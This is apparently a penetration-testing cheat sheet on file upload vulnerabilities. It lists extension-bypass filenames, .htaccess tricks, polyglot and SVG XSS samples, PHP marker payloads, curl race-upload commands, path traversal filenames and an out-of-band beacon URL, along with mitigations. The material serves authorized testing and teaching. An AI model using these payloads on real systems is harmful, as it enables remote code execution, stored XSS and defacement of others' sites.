## 📤 File Upload Cheat Sheet

> **Scope:** Authorized testing only. Use systems you own or have explicit written permission to assess. Examples use placeholders (`<TARGET>`, `<USER>`, `<OOB-HOST>`, `<LOCAL_TEST_FILE>`) and harmless markers — never store real flags, keys, or credentials.
---
### 🧭 **1. Quick Reference**

| Check | Weak assumption | Probe |
|-------|-----------------|-------|
| Extension | Blacklist of `.php`, `.jsp` | `phtml`, `php5`, `phar`, `.php.jpg`, trailing dot/space |
| Content-Type | Trusts request header | Swap `image/png` ↔ `text/plain` |
| Magic bytes | Trusts first bytes | `GIF89a` prefix before arbitrary content |
| Image validity | `getimagesize()` true | Polyglot / crafted metadata |
| Path / lifecycle | Name used verbatim; file deleted later | `../`, absolute path, race |

Proof goal: make the server treat an uploaded artifact as executable or active content, then show execution with a harmless marker such as `UPLOAD_POC_OK`.

### 🔍 **2. Map the Pipeline**

```http
POST http://<TARGET>/upload HTTP/1.1
Host: <TARGET>
Content-Type: multipart/form-data; boundary=BOUNDARY

--BOUNDARY
Content-Disposition: form-data; name="avatar"; filename="<USER>.png"
Content-Type: image/png

<BINARY>
--BOUNDARY--
```
Record accepted extensions, size limits, stored path, whether the name changes, whether the image is re-encoded, and which handler serves the directory.

| Observation | Interpretation |
|-------------|----------------|
| Original name in URL | Name-based validation likely |
| Served as `image/png` | Type derived from path/extension |
| Dimensions change | Re-encoding may destroy appended data |
| Downloads as attachment / 500 on odd extension | Blocked headers / parser mismatch |

### 🧪 **3. Extension Checks**

```text
shell.php
shell.phtml
shell.php5
shell.phar
shell.php.
shell.php%00.png
shell.jpg.php
.htaccess
.user.ini
```
Case matters only if validation is case-sensitive. Trailing dots/spaces matter on Windows; null bytes only on legacy stacks. Double extensions work when a handler maps a hidden or later extension. `.htaccess` / `.user.ini` can change sibling parsing; config overwrite often beats a direct shell.

### 📄 **4. Content-Type, Magic Bytes, Polyglots**

```http
Content-Disposition: form-data; name="file"; filename="<USER>.php"
Content-Type: image/png
```
The multipart `Content-Type` is client-controlled; changing it proves little unless the response or handler changes too.

```text
GIF89a;UPLOAD_POC_OK
PNG signature + IHDR / JPEG SOI + EXIF + appended marker bytes
```

```bash
file <LOCAL_TEST_FILE>
xxd -l 32 <LOCAL_TEST_FILE>
exiftool <LOCAL_TEST_FILE>
```
A polyglot is valid in two formats (image + script/source). Full image decode/re-encode usually strips appended data — re-download to confirm.

### 🧩 **5. Active-Content Concepts**

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text>UPLOAD_POC_OK</text>
</svg>
```
```php
<?php
// Concept only: server-side code in an uploaded file.
// Harmless marker instead of a real command interface.
echo 'UPLOAD_POC_OK';
?>
```
```text
GIF89a<?php echo 'UPLOAD_POC_OK'; ?>
```
A webshell is server-side code that dispatches commands from a parameter. Document the concept and a marker; do not retain a live command interface or real secrets.

| Format | Risk when served inline |
|--------|--------------------------|
| SVG / HTML | Stored XSS, phishing, redirect in site origin |
| PHP / JSP / ASPX | RCE if a handler is enabled |
| PDF / XML / ZIP | Parser bugs, XXE, "Zip Slip" traversal |

### ⏱️ **6. Race and Overwrite**

| Technique | Idea |
|-----------|------|
| TOCTOU | Check runs on a temp copy; moved file differs |
| Slow / concurrent | Delay body or race two uploads for one filename |
| Post-check cleanup | Access the file before deletion |
| Overwrite | Reuse `index.html`, `avatar.png`, config |
| Symlink/archive | Extraction follows links or `../` entries |

```bash
curl -s -X POST -F 'file=@<LOCAL_TEST_FILE>' http://<TARGET>/upload &
curl -s -X POST -F 'file=@<LOCAL_TEST_FILE>' http://<TARGET>/upload &
wait
```
```text
filename="../../<USER>.php"
filename="%2e%2e%2f<USER>.php"
```
Request the file directly, via an include/rewrite endpoint (`?page=<USER>.png`), and with a different `Accept` header.

### 👁️ **7. Blind and Chained Tests**

- SVG/HTML beacon confirms inline rendering: `https://<OOB-HOST>/u?f=<USER>`.
- Combine with LFI and check CDN/cache persistence after origin cleanup; test quotas in a lab.

### 🛠️ **8. Tools**

| Tool | Use |
|------|-----|
| **Burp Suite / ffuf** | Multipart Repeater; extension fuzzing |
| **curl** | Fast upload and race experiments |
| **ExifTool / `file` / OOB collector** | Polyglot inspection; blind callbacks |

### 💥 **9. Impact**

RCE via server-side parsing; stored XSS via SVG/HTML; defacement, phishing, cache poisoning; config overwrite and path traversal; disk-exhaustion DoS.

### 🔐 **10. Mitigation**

- Enforce an extension **allowlist**; rename to random, non-executable IDs.
- Store outside the web root on a separate domain/CDN with `Content-Disposition: attachment`.
- Decode/re-encode images; never trust client `Content-Type` or magic bytes alone.
- Strip paths from filenames, scan active content; apply size/rate limits and atomic moves.
- Disable execution in upload directories and minimize handler rules.

### ✅ **11. Testing Checklist**

- [ ] Authorization/scope confirmed; harmless markers used.
- [ ] Extension case, double/trailing, and alternate handlers tested.
- [ ] Content-Type changed independently of filename.
- [ ] Magic bytes, polyglots, re-encoding, and headers checked; traversal/race considered.
- [ ] No real secrets or live webshell retained.

### 📚 **12. References**

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) · [MDN Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)

**📤 Happy Hacking!**
